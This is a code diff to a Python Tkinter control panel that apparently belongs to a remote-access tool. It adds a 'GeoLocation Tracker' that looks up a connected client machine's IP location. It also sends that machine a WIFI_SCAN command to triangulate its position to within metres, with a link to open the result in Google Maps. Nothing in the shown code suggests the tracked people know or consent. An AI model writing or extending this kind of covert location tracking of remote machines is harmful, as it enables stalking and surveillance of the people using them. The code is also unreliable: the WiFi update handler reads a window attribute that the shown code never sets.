@@ -1386,25 +1386,24 @@ def show_geolocation():
         messagebox.showerror("No Client", "Please select a client first!")
         return
 
-    # Get the client's IP
     with g.clients_lock:
         if g.active_client_id not in g.clients:
             messagebox.showerror("Error", "Client not found!")
             return
         client_ip = g.clients[g.active_client_id]["addr"][0]
 
-    # Singleton check
     if g.geo_window and g.geo_window.winfo_exists():
         g.geo_window.lift()
         g.geo_window.focus_force()
         return
 
-    # ── Create Window ──────────────────────────────────────────────────────────
+    # ── Window ─────────────────────────────────────────────────────────────────
     win = tk.Toplevel(g.root)
     win.title("🗺️ GeoLocation Tracker")
-    win.geometry("600x620")
+    win.geometry("640x700")
     win.configure(bg="#0D0D1A")
-    win.resizable(False, False)
+    win.resizable(True, True)
+    win.minsize(560, 500)
     g.geo_window = win
 
     def on_close():
@@ -1418,24 +1417,69 @@ def show_geolocation():
     hdr.pack_propagate(False)
     tk.Label(hdr, text="🗺️  GEOLOCATION TRACKER", font=("Segoe UI", 14, "bold"),
              bg="#1A0A2E", fg="#00E5FF").pack(side="left", padx=20, pady=15)
-    ip_badge = tk.Label(hdr, text=f"🌐 {client_ip}", font=("Segoe UI", 11, "bold"),
-                        bg="#00BCD4", fg="white", padx=12, pady=4)
-    ip_badge.pack(side="right", padx=20, pady=18)
+    ip_badge = tk.Label(hdr, text=f"🌐 {client_ip}", font=("Segoe UI", 10, "bold"),
+                        bg="#00BCD4", fg="white", padx=10, pady=4)
+    ip_badge.pack(side="right", padx=15, pady=18)
 
-    # ── Loading spinner text ───────────────────────────────────────────────────
-    body = tk.Frame(win, bg="#0D0D1A")
-    body.pack(fill="both", expand=True, padx=20, pady=15)
+    # ── Scrollable Canvas Body ─────────────────────────────────────────────────
+    outer = tk.Frame(win, bg="#0D0D1A")
+    outer.pack(fill="both", expand=True, padx=0, pady=0)
 
-    loading_lbl = tk.Label(body, text="⏳  Fetching location data...",
+    canvas = tk.Canvas(outer, bg="#0D0D1A", highlightthickness=0)
+    scrollbar = tk.Scrollbar(outer, orient="vertical", command=canvas.yview)
+    canvas.configure(yscrollcommand=scrollbar.set)
+
+    scrollbar.pack(side="right", fill="y")
+    canvas.pack(side="left", fill="both", expand=True)
+
+    body = tk.Frame(canvas, bg="#0D0D1A")
+    body_window = canvas.create_window((0, 0), window=body, anchor="nw")
+
+    def on_body_configure(event):
+        canvas.configure(scrollregion=canvas.bbox("all"))
+    body.bind("<Configure>", on_body_configure)
+
+    def on_canvas_configure(event):
+        canvas.itemconfig(body_window, width=event.width)
+    canvas.bind("<Configure>", on_canvas_configure)
+
+    # Mouse wheel scrolling
+    def on_mousewheel(event):
+        canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")
+    canvas.bind_all("<MouseWheel>", on_mousewheel)
+    win.bind("<Destroy>", lambda e: canvas.unbind_all("<MouseWheel>"))
+
+    # ── Loading ────────────────────────────────────────────────────────────────
+    loading_lbl = tk.Label(body, text="⏳  Fetching IP location data...",
                             font=("Segoe UI", 13), bg="#0D0D1A", fg="#90A4AE")
-    loading_lbl.pack(pady=60)
+    loading_lbl.pack(pady=50)
 
-    # ── Fetch geo data in background ───────────────────────────────────────────
+    # ── Shared state for coordinate updates ───────────────────────────────────
+    state = {"lat": None, "lon": None, "coord_label": None,
+             "acc_label": None, "maps_url": None}
+
+    # ── Helper: add info row ───────────────────────────────────────────────────
+    def add_row(parent, label, value, value_color="#E0E0E0"):
+        row = tk.Frame(parent, bg="#131325", height=44)
+        row.pack(fill="x", padx=15, pady=3)
+        row.pack_propagate(False)
+        tk.Label(row, text=label, font=("Segoe UI", 10, "bold"),
+                 bg="#131325", fg="#78909C", width=18, anchor="w").pack(side="left", padx=12)
+        lbl = tk.Label(row, text=value, font=("Segoe UI", 11),
+                 bg="#131325", fg=value_color, anchor="w")
+        lbl.pack(side="left", padx=5)
+        return lbl
+
+    # ── Section header helper ──────────────────────────────────────────────────
+    def add_section(parent, title, color="#00E5FF"):
+        tk.Label(parent, text=title, font=("Segoe UI", 10, "bold"),
+                 bg="#0D0D1A", fg=color).pack(anchor="w", padx=18, pady=(14, 4))
+
+    # ── IP Geo Fetch ───────────────────────────────────────────────────────────
     def fetch_geo():
         import urllib.request, json as _json
 
         def is_private(ip):
-            """Return True if IP is localhost or RFC-1918 private."""
             return (ip.startswith("127.") or ip.startswith("10.") or
                     ip.startswith("192.168.") or ip == "::1" or
                     any(ip.startswith(f"172.{i}.") for i in range(16, 32)))
@@ -1444,104 +1488,192 @@ def show_geolocation():
             lookup_ip = client_ip
             display_ip = client_ip
 
-            # If private/localhost → fetch actual public IP of the client machine
             if is_private(client_ip):
                 try:
-                    pub_resp = urllib.request.urlopen(
-                        "https://api.ipify.org?format=json", timeout=5)
-                    pub_data = _json.loads(pub_resp.read().decode())
-                    lookup_ip = pub_data.get("ip", client_ip)
-                    display_ip = f"{client_ip}  →  Public: {lookup_ip}"
-                    # Update IP badge on main thread
+                    pub = urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5)
+                    lookup_ip = _json.loads(pub.read().decode()).get("ip", client_ip)
+                    display_ip = f"{client_ip}  →  {lookup_ip}"
                     g.root.after(0, lambda d=display_ip: ip_badge.config(text=f"🌐 {d}"))
                 except Exception:
-                    pass  # Fall through with original IP
+                    pass
 
             url = (f"http://ip-api.com/json/{lookup_ip}"
                    f"?fields=status,message,country,regionName,city,zip,"
-                   f"lat,lon,isp,org,as,query,timezone,mobile,proxy,hosting")
+                   f"lat,lon,isp,org,timezone,mobile,proxy,hosting")
             req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
             with urllib.request.urlopen(req, timeout=8) as resp:
                 data = _json.loads(resp.read().decode())
 
             if data.get("status") == "success":
-                g.root.after(0, lambda: show_geo_result(data))
+                g.root.after(0, lambda d=data: show_ip_result(d))
             else:
-                msg = data.get("message", "Unknown error")
-                g.root.after(0, lambda m=msg: show_geo_error(
-                    f"API Error: {m}\n(IP: {lookup_ip})"))
+                g.root.after(0, lambda m=data.get("message","err"): show_error(m))
         except Exception as e:
-            g.root.after(0, lambda err=str(e): show_geo_error(f"Network Error: {err}"))
+            g.root.after(0, lambda err=str(e): show_error(err))
 
-    def show_geo_error(msg):
+    def show_error(msg):
         if not win.winfo_exists(): return
         loading_lbl.config(text=f"❌ {msg}", fg="#EF5350")
 
-    def show_geo_result(d):
+    def show_ip_result(d):
         if not win.winfo_exists(): return
         loading_lbl.destroy()
 
-        # ── Info Cards ─────────────────────────────────────────────────────────
-        fields = [
-            ("🌍 Country",      d.get("country", "N/A")),
-            ("🏙️ Region/City",  f"{d.get('regionName','N/A')} / {d.get('city','N/A')}"),
-            ("📮 ZIP Code",     d.get("zip", "N/A")),
-            ("📍 Coordinates",  f"{d.get('lat','N/A')}°N, {d.get('lon','N/A')}°E"),
-            ("🕐 Timezone",     d.get("timezone", "N/A")),
-            ("📡 ISP",          d.get("isp", "N/A")),
-            ("🏢 Organization", d.get("org", "N/A")),
-            ("📶 Mobile Data",  "Yes ✅" if d.get("mobile") else "No ❌"),
-            ("🔒 Proxy/VPN",    "Detected ⚠️" if d.get("proxy") else "Not Detected ✅"),
-            ("🖥️ Datacenter",   "Yes (Hosting) ⚠️" if d.get("hosting") else "No ✅"),
-        ]
-
-        for label, value in fields:
-            row = tk.Frame(body, bg="#131325", relief="flat")
-            row.pack(fill="x", pady=3, ipady=8, ipadx=10)
-            row.pack_propagate(False)
-            row.configure(height=42)
-
-            tk.Label(row, text=label, font=("Segoe UI", 10, "bold"),
-                     bg="#131325", fg="#78909C", width=18, anchor="w").pack(side="left", padx=12)
-            tk.Label(row, text=value, font=("Segoe UI", 11),
-                     bg="#131325", fg="#E0E0E0", anchor="w").pack(side="left", padx=5)
-
-        # ── Proxy/VPN Warning ──────────────────────────────────────────────────
-        if d.get("proxy") or d.get("hosting"):
-            warn = tk.Label(body, text="⚠️  VPN / Proxy / Hosting detected — location may be inaccurate",
-                            font=("Segoe UI", 9, "italic"), bg="#0D0D1A", fg="#FFA726")
-            warn.pack(pady=(8, 0))
-
-        # ── Buttons ────────────────────────────────────────────────────────────
-        btn_frame = tk.Frame(body, bg="#0D0D1A")
-        btn_frame.pack(pady=18)
-
         lat, lon = d.get("lat"), d.get("lon")
-        maps_url = f"https://www.google.com/maps?q={lat},{lon}&z=12"
+        state["lat"] = lat
+        state["lon"] = lon
+        state["maps_url"] = f"https://www.google.com/maps?q={lat},{lon}&z=10"
 
-        def open_in_maps():
+        # ── IP-based Info ──────────────────────────────────────────────────────
+        add_section(body, "📡  IP-BASED LOCATION  (city-level, ~5-50 km accuracy)")
+
+        add_row(body, "🌍 Country",      d.get("country", "N/A"))
+        add_row(body, "🏙️ Region/City",  f"{d.get('regionName','N/A')} / {d.get('city','N/A')}")
+        add_row(body, "📮 ZIP Code",     d.get("zip", "N/A"))
+        coord_lbl = add_row(body, "📍 Coordinates",
+                            f"{lat}°N,  {lon}°E",
+                            value_color="#00E5FF")
+        state["coord_label"] = coord_lbl
+
+        acc_lbl = add_row(body, "🎯 Accuracy",
+                          "~city level  (use WiFi scan below for precise)",
+                          value_color="#FFA726")
+        state["acc_label"] = acc_lbl
+
+        add_row(body, "🕐 Timezone",     d.get("timezone", "N/A"))
+        add_row(body, "📡 ISP",          d.get("isp", "N/A"))
+        add_row(body, "🏢 Organization", d.get("org", "N/A"))
+        add_row(body, "📶 Mobile Data",  "Yes ✅" if d.get("mobile") else "No ❌")
+        add_row(body, "🔒 Proxy/VPN",    "Detected ⚠️" if d.get("proxy") else "Not Detected ✅",
+                value_color="#FFA726" if d.get("proxy") else "#66BB6A")
+        add_row(body, "🖥️ Datacenter",   "Yes ⚠️" if d.get("hosting") else "No ✅",
+                value_color="#FFA726" if d.get("hosting") else "#66BB6A")
+
+        # ── Separator ─────────────────────────────────────────────────────────
+        tk.Frame(body, bg="#2A2A4A", height=2).pack(fill="x", padx=15, pady=12)
+
+        # ── Precise Location Section ───────────────────────────────────────────
+        add_section(body, "🎯  PRECISE LOCATION  (WiFi-based, ~10-100 m accuracy)", "#FF6F00")
+
+        info_lbl = tk.Label(
+            body,
+            text="Click below to scan nearby WiFi networks on the client machine\n"
+                 "and triangulate using Mozilla Location Services (FREE, no API key).",
+            font=("Segoe UI", 9), bg="#0D0D1A", fg="#90A4AE", justify="left"
+        )
+        info_lbl.pack(anchor="w", padx=18, pady=(0, 8))
+
+        wifi_status = tk.Label(body, text="", font=("Segoe UI", 10),
+                               bg="#0D0D1A", fg="#FFA726")
+        wifi_status.pack(anchor="w", padx=18)
+
+        def do_wifi_scan():
+            wifi_btn.config(state="disabled", text="⏳ Scanning WiFi...")
+            wifi_status.config(text="Sending WIFI_SCAN command to client...", fg="#90A4AE")
+            import gui_commands as cmds
+            threading.Thread(
+                target=cmds.execute_command,
+                args=("WIFI_SCAN", "WiFi Precise Location"),
+                daemon=True
+            ).start()
+
+        wifi_btn = tk.Button(
+            body, text="🎯  Scan WiFi → Get Precise Location",
+            command=do_wifi_scan,
+            font=("Segoe UI", 11, "bold"),
+            bg="#E65100", fg="white", activebackground="#FF6F00",
+            relief="flat", padx=20, pady=10, cursor="hand2"
+        )
+        wifi_btn.pack(fill="x", padx=15, pady=(4, 12))
+
+        # Store references for wifi result update
+        state["wifi_btn"]    = wifi_btn
+        state["wifi_status"] = wifi_status
+
+        # ── Bottom Buttons ─────────────────────────────────────────────────────
+        tk.Frame(body, bg="#2A2A4A", height=2).pack(fill="x", padx=15, pady=8)
+
+        btn_row = tk.Frame(body, bg="#0D0D1A")
+        btn_row.pack(pady=10, padx=15, fill="x")
+
+        def open_maps():
             import webbrowser
-            webbrowser.open(maps_url)
+            webbrowser.open(state["maps_url"])
 
         def copy_coords():
-            coords = f"{lat}, {lon}"
+            coords = f"{state['lat']}, {state['lon']}"
             win.clipboard_clear()
             win.clipboard_append(coords)
-            messagebox.showinfo("Copied", f"Coordinates copied:\n{coords}")
+            messagebox.showinfo("Copied", f"Copied:\n{coords}")
 
-        map_btn = tk.Button(btn_frame, text="🗺️  Open in Google Maps",
-                            command=open_in_maps,
-                            font=("Segoe UI", 11, "bold"), bg="#00897B", fg="white",
-                            relief="flat", padx=20, pady=10, cursor="hand2")
-        map_btn.pack(side="left", padx=8)
+        tk.Button(btn_row, text="🗺️  Open in Google Maps", command=open_maps,
+                  font=("Segoe UI", 11, "bold"), bg="#00897B", fg="white",
+                  relief="flat", padx=16, pady=10, cursor="hand2").pack(side="left", padx=6)
 
-        copy_btn = tk.Button(btn_frame, text="📋  Copy Coords",
-                             command=copy_coords,
-                             font=("Segoe UI", 11, "bold"), bg="#3949AB", fg="white",
-                             relief="flat", padx=20, pady=10, cursor="hand2")
-        copy_btn.pack(side="left", padx=8)
+        tk.Button(btn_row, text="📋  Copy Coords", command=copy_coords,
+                  font=("Segoe UI", 11, "bold"), bg="#3949AB", fg="white",
+                  relief="flat", padx=16, pady=10, cursor="hand2").pack(side="left", padx=6)
+
+        tk.Label(body, text="", bg="#0D0D1A").pack(pady=10)  # bottom padding
 
     threading.Thread(target=fetch_geo, daemon=True).start()
+
+
+def update_geo_wifi_result(data):
+    """Called from gui_commands.py when WIFI_SCAN response arrives."""
+    if not g.geo_window or not g.geo_window.winfo_exists():
+        return
+
+    win = g.geo_window
+    # Retrieve state from the geo window's attribute
+    try:
+        state = win._geo_state
+    except AttributeError:
+        return
+
+    status   = data.get("status")
+    wifi_btn = state.get("wifi_btn")
+    wifi_lbl = state.get("wifi_status")
+
+    if wifi_btn and wifi_btn.winfo_exists():
+        wifi_btn.config(state="normal", text="🎯  Scan WiFi → Get Precise Location")
+
+    if status == "error":
+        if wifi_lbl and wifi_lbl.winfo_exists():
+            wifi_lbl.config(text=f"❌ {data.get('message','Error')}", fg="#EF5350")
+        return
+
+    lat     = data.get("lat")
+    lon     = data.get("lon")
+    acc     = data.get("accuracy")  # metres
+    count   = data.get("wifi_count", "?")
+
+    if not lat or not lon:
+        if wifi_lbl and wifi_lbl.winfo_exists():
+            wifi_lbl.config(text="❌ No location returned from MLS.", fg="#EF5350")
+        return
+
+    state["lat"] = lat
+    state["lon"] = lon
+    state["maps_url"] = f"https://www.google.com/maps?q={lat},{lon}&z=18"
+
+    method = data.get("method", "Precise")
+
+    if state.get("coord_label") and state["coord_label"].winfo_exists():
+        state["coord_label"].config(
+            text=f"{lat:.6f}°N,  {lon:.6f}°E  ← 🎯 WiFi Precise",
+            fg="#00FF88"
+        )
+    if state.get("acc_label") and state["acc_label"].winfo_exists():
+        acc_txt = f"~{acc:.0f} metres  ({count} WiFi networks used)" if acc else "Unknown"
+        state["acc_label"].config(text=f"🎯 {acc_txt}", fg="#00FF88")
+
+    if wifi_lbl and wifi_lbl.winfo_exists():
+        acc_txt = f"~{acc:.0f}m" if acc else "±unknown"
+        wifi_lbl.config(
+            text=f"✅ {method}  |  Accuracy: {acc_txt}  ({count} APs)",
+            fg="#66BB6A"
+        )
 
 
 # ── Live Screen Monitor ───────────────────────────────────────────────────────
